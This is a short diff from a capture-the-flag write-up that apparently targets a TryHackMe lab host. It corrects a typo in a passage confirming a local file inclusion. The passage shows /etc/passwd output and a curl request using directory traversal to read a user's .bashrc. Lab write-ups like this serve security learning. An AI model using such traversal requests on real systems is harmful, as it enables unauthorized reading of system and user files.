@@ -243,7 +243,7 @@ sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
 ````
 
 This confirms that there is a working LFI. There is a "Dale" user with ID 1000 so I will start with that.
-I also confirmed that the "Dale" user has a home folder with with curl.
+I also confirmed that the "Dale" user has a home folder with curl.
 ````
 curl http://dev.team.thm/script.php?page=../../../../../../../../../home/dale/.bashrc
 
